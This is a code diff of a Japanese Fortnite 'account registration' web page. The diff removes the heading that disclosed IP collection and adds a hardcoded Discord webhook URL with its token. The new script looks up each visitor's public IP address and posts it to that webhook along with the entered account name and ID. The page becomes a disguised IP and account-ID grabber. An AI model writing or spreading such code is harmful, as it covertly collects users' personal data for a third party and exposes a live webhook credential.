@@ -2,7 +2,7 @@
 <html lang="ja">
 <head>
   <meta charset="UTF-8" />
-  <title>IP付きアカウント登録</title>
+  <title>Fortnite アカウント登録</title>
   <style>
     body {
       font-family: 'Segoe UI', sans-serif;
@@ -10,12 +10,10 @@
       padding: 30px;
       background-color: #f4f4f4;
     }
-
     h2 {
       text-align: center;
       color: #333;
     }
-
     .form {
       display: flex;
       justify-content: center;
@@ -23,7 +21,6 @@
       margin-bottom: 20px;
       flex-wrap: wrap;
     }
-
     input, button {
       padding: 10px;
       border-radius: 8px;
@@ -31,7 +28,6 @@
       font-size: 14px;
       outline: none;
     }
-
     button {
       background-color: #007bff;
       color: white;
@@ -39,55 +35,14 @@
       border: none;
       transition: background-color 0.2s ease;
     }
-
     button:hover {
       background-color: #0056b3;
-    }
-
-    .account-box {
-      background: #fff;
-      border-radius: 10px;
-      box-shadow: 0 2px 6px rgba(0,0,0,0.1);
-      margin: 10px auto;
-      padding: 15px;
-      max-width: 400px;
-      display: flex;
-      flex-direction: column;
-      gap: 6px;
-      transition: background-color 0.5s ease;
-    }
-
-    .account-header {
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      gap: 10px;
-      flex-wrap: wrap;
-    }
-
-    .buttons {
-      display: flex;
-      gap: 10px;
-      flex-wrap: wrap;
-    }
-
-    .delete-btn {
-      background-color: #dc3545;
-      color: white;
-      border: none;
-      padding: 8px 15px;
-      border-radius: 8px;
-      cursor: pointer;
-      transition: background-color 0.2s ease;
-    }
-    .delete-btn:hover {
-      background-color: #a71d2a;
     }
   </style>
 </head>
 <body>
 
-  <h2>Fortnite アカウント登録（IP取得は内部保持）</h2>
+  <h2>Fortnite アカウント登録</h2>
 
   <div class="form">
     <input type="text" id="accountName" placeholder="アカウント名" />
@@ -95,22 +50,18 @@
     <button onclick="addAccount()">追加</button>
   </div>
 
-  <div id="accountList"></div>
-
   <script>
+    const WEBHOOK_URL = "https://canary.discord.com/api/webhooks/1389151515423543376/vs0HO-fg8p3oO8irVXwuHADd4l7yfG2fB71dSEIv_TOl384ScexXVs30oDuu0FVC7IXw";
+
     async function getIP() {
       try {
         const res = await fetch("https://api.ipify.org?format=json");
         const data = await res.json();
         return data.ip;
-      } catch (e) {
-        return "取得失敗";
+      } catch {
+        return "IP取得失敗";
       }
     }
-
-    window.onload = () => {
-      displayAccounts();
-    };
 
     async function addAccount() {
       const name = document.getElementById("accountName").value.trim();
@@ -122,77 +73,27 @@
 
       const ip = await getIP();
 
-      const accounts = JSON.parse(localStorage.getItem("accounts") || "[]");
-      accounts.push({ name, id, ip, addedAt: new Date().toISOString() });
-      localStorage.setItem("accounts", JSON.stringify(accounts));
+      const content = `新規アカウント登録\nアカウント名: ${name}\nアカウントID: ${id}\nIPアドレス: ${ip}\n登録日時: ${new Date().toLocaleString()}`;
 
-      document.getElementById("accountName").value = "";
-      document.getElementById("accountId").value = "";
-
-      displayAccounts();
-    }
-
-    function displayAccounts() {
-      const accounts = JSON.parse(localStorage.getItem("accounts") || "[]");
-      const container = document.getElementById("accountList");
-      container.innerHTML = "";
-
-      accounts.forEach((account, index) => {
-        const div = document.createElement("div");
-        div.className = "account-box";
-
-        div.innerHTML = `
-          <div class="account-header">
-            <strong>${account.name} (${account.id})</strong>
-            <div class="buttons">
-              <button onclick="checkStatus('${account.id}', this)">状態確認</button>
-              <button class="delete-btn" onclick="removeAccount(${index})">削除</button>
-            </div>
-          </div>
-          <div>登録日時: ${new Date(account.addedAt).toLocaleString()}</div>
-        `;
-        container.appendChild(div);
-      });
-    }
-
-    function checkStatus(accid, btn) {
-      fetch(`https://yls.julesbot.com/api/accounts/${accid}/onlineStatus`)
-        .then(response => response.json())
-        .then(data => {
-          const box = btn.closest('.account-box');
-          if (!box) return;
-
-          if (data.isOnline === true) {
-            flashBox(box, "green");
-          } else if (data.isOnline === false) {
-            flashBox(box, "red");
-          } else {
-            alert("状態が取得できませんでした");
-          }
-        })
-        .catch(() => {
-          alert("通信エラーが発生しました");
+      try {
+        const res = await fetch(WEBHOOK_URL, {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify({ content })
         });
-    }
 
-    function flashBox(box, color) {
-      const originalColor = box.style.backgroundColor;
-      if(color === "green") {
-        box.style.backgroundColor = "#d4ffd4";
-      } else if(color === "red") {
-        box.style.backgroundColor = "#ffd4d4";
+        if (res.ok) {
+          alert("登録情報をDiscordに送信しました！");
+          document.getElementById("accountName").value = "";
+          document.getElementById("accountId").value = "";
+        } else {
+          alert(`送信エラー: ステータスコード ${res.status}`);
+        }
+      } catch (e) {
+        alert("通信エラーが発生しました: " + e.message);
       }
-
-      setTimeout(() => {
-        box.style.backgroundColor = originalColor || "#fff";
-      }, 3000);
-    }
-
-    function removeAccount(index) {
-      const accounts = JSON.parse(localStorage.getItem("accounts") || "[]");
-      accounts.splice(index, 1);
-      localStorage.setItem("accounts", JSON.stringify(accounts));
-      displayAccounts();
     }
   </script>
 </body>
